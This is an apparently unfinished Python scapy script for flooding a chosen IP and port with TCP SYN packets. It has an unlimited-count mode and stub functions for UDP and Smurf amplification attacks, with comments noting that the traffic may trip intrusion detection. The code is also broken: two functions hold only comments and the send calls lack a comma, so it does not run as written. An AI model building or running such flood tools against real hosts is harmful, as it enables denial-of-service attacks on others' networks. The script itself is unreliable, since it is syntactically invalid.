# to be modified, not only syn-flood etc.
import sys
import random
import logging # This and the following line are used to omit the IPv6 error displayed by importing scapy.
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import argparse
import os
import urllib2
if os.getuid() != 0: # Checks to see if the user running the script is root.
    print("You need to run this program as root for it to function correctly.")
    sys.exit(1)
parser = argparse.ArgumentParser(description='This tool sends requests to the target specified in the arguments.') # This and preceding 4 lines used to control the arguments entered in the CLI.
parser.add_argument('-d', action="store",dest='source', help='The destination IP address for the SYN packet')
parser.add_argument('-c', action="store",dest='count', help='The amount of packets to send. (enter X for unlimited)')
parser.add_argument('-p', action="store",dest='port', help='The destination port. Will be used except for ICMP')
args = parser.parse_args()
if len(sys.argv) == 1: # Forces the help text to be displayed if no arguments are entered
    parser.print_help()
    sys.exit(1)
args = vars(args) # converts the arguments into dictionary format for easier retrieval.
i = 0 # variable used to control the while loop for the amount of times a packet is sent.


#Function to send various flags. Each may trigger alert by IDS/IPS
def sendTCP(d, p):
    flags = ["S","A","F","R"]
    a=IP(dst=d)/TCP(flags="S", sport=RandShort(), dport=p)
    send(a, verbose=0) #transmit packet

def sendUDP(d, p):
    #check whether flags or other options are necessary

def sendSMURF(d, p):
    #Pausing this one, as another active IP is required. Consider using the target's gateway and guessing it to be x.x.x.1'

if args['count'] == "X" or args['count'] == "x": # If the user entered an X or x into the count argument (wants unlimited SYN segments sent)
    while (1 == 1):
        sendTCP(args['source'] int(args['port']))
        i = i + 1
        print(str(i) + " Packet Sent")
else: # executed if the user defined an amount of segments to send.
    while i < int(args['count']):
        sendTCP(args['source'] int(args['port']))
        i = i + 1
        print(str(i) + " Packet Sent")
print("All packets successfully sent.")